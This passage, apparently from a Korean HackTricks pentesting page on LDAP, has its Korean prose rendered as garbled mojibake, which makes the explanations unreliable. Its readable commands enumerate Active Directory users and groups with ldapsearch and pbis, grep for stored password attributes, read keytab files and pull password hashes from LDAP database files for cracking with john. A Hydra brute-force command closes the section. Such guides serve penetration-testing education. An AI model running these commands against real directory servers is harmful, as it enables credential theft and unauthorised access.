5. "ë¡œê·¸ì¸" ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ì•¡ì„¸ìŠ¤í•©ë‹ˆë‹¤.

ì›ê²© ë°ìŠ¤í¬í†± ê·¸ë£¹ì„ ì¶”ì¶œí•˜ëŠ” ê²ƒì€ ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•œ ì¤‘ìš”í•œ ë‹¨ê³„ì…ë‹ˆë‹¤. ì´ ê·¸ë£¹ì— ì†í•œ ì‚¬ìš©ìëŠ” ì›ê²©ìœ¼ë¡œ ì»´í“¨í„°ì— ë¡œê·¸ì¸í•˜ê³  ì‘ì—…í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë³´ì•ˆì„ ìœ ì§€í•˜ê¸° ìœ„í•´ ì•”í˜¸ë¥¼ ì•ˆì „í•˜ê²Œ ê´€ë¦¬í•´ì•¼ í•©ë‹ˆë‹¤.
```
```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
```
ì–´ë–¤ ë¹„ë°€ë²ˆí˜¸ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ë ¤ë©´ ë‹¤ìŒ ì¿¼ë¦¬ ì¤‘ í•˜ë‚˜ë¥¼ ì‹¤í–‰í•œ í›„ grepì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"
```
#### pbis

**pbis**ëŠ” ì—¬ê¸°ì—ì„œ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://github.com/BeyondTrust/pbis-open/](https://github.com/BeyondTrust/pbis-open/) ê·¸ë¦¬ê³  ì¼ë°˜ì ìœ¼ë¡œ `/opt/pbis`ì— ì„¤ì¹˜ë©ë‹ˆë‹¤.\
**pbis**ë¥¼ ì‚¬ìš©í•˜ë©´ ê¸°ë³¸ ì •ë³´ë¥¼ ì‰½ê²Œ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
#Read keytab file
./klist -k /etc/krb5.keytab

#Get known domains info
./get-status
./lsa get-status

#Get basic metrics
./get-metrics
./lsa get-metrics

#Get users
./enum-users
./lsa enum-users

#Get groups
./enum-groups
./lsa enum-groups

#Get all kind of objects
./enum-objects
./lsa enum-objects

#Get groups of a user
./list-groups-for-user <username>
./lsa list-groups-for-user <username>
#Get groups of each user
./enum-users | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do ./list-groups-for-user "$name"; echo -e "========================\n"; done

#Get users of a group
./enum-members --by-name "domain admins"
./lsa enum-members --by-name "domain admins"
#Get users of each group
./enum-groups | grep "Name:" | sed -e "s,\\\,\\\\\\\,g" | awk '{print $2}' | while read name; do echo "$name"; ./enum-members --by-name "$name"; echo -e "========================\n"; done

#Get description of each user
./adtool -a search-user --name CN="*" --keytab=/etc/krb5.keytab -n <Username> | grep "CN" | while read line; do
echo "$line";
./adtool --keytab=/etc/krb5.keytab -n <username> -a lookup-object --dn="$line" --attr "description";
echo "======================"
done
```
## ê·¸ë˜í”½ ì¸í„°í˜ì´ìŠ¤

### Apache Directory

[**ì—¬ê¸°ì—ì„œ Apache Directoryë¥¼ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”**](https://directory.apache.org/studio/download/download-linux.html). ì´ ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ëŠ” [ì˜ˆì œë¥¼ ì—¬ê¸°ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://www.youtube.com/watch?v=VofMBg2VLnw\&t=3840s).

### jxplorer

LDAP ì„œë²„ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ê·¸ë˜í”½ ì¸í„°í˜ì´ìŠ¤ë¥¼ ì—¬ê¸°ì—ì„œ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [http://www.jxplorer.org/downloads/users.html](http://www.jxplorer.org/downloads/users.html)

ê¸°ë³¸ì ìœ¼ë¡œ _/opt/jxplorer_ì— ì„¤ì¹˜ë©ë‹ˆë‹¤.

![](<../.gitbook/assets/image (22) (1).png>)

### Godap

[https://github.com/Macmod/godap](https://github.com/Macmod/godap)ì—ì„œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Kerberosë¥¼ í†µí•œ ì¸ì¦

`ldapsearch`ë¥¼ ì‚¬ìš©í•˜ì—¬ **NTLM ëŒ€ì‹ ** **Kerberosë¥¼ í†µí•´ ì¸ì¦**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ `-Y GSSAPI` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

## POST

ë°ì´í„°ë² ì´ìŠ¤ê°€ í¬í•¨ëœ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆë‹¤ë©´ (ì¼ë°˜ì ìœ¼ë¡œ _/var/lib/ldap_ì— ìœ„ì¹˜), ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ í•´ì‹œë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
```
johnì—ê²Œ íŒ¨ìŠ¤ì›Œë“œ í•´ì‹œë¥¼ ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ ('{SSHA}'ì—ì„œ 'structural'ê¹Œì§€ 'structural'ì„ ì¶”ê°€í•˜ì§€ ì•Šê³ ).

### êµ¬ì„± íŒŒì¼

* ì¼ë°˜
* containers.ldif
* ldap.cfg
* ldap.conf
* ldap.xml
* ldap-config.xml
* ldap-realm.xml
* slapd.conf
* IBM SecureWay V3 ì„œë²„
* V3.sas.oc
* Microsoft Active Directory ì„œë²„
* msadClassesAttrs.ldif
* Netscape Directory Server 4
* nsslapd.sas\_at.conf
* nsslapd.sas\_oc.conf
* OpenLDAP ë””ë ‰í† ë¦¬ ì„œë²„
* slapd.sas\_at.conf
* slapd.sas\_oc.conf
* Sun ONE Directory Server 5.1
* 75sas.ldif

## HackTricks ìë™ ëª…ë ¹ì–´
```
Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
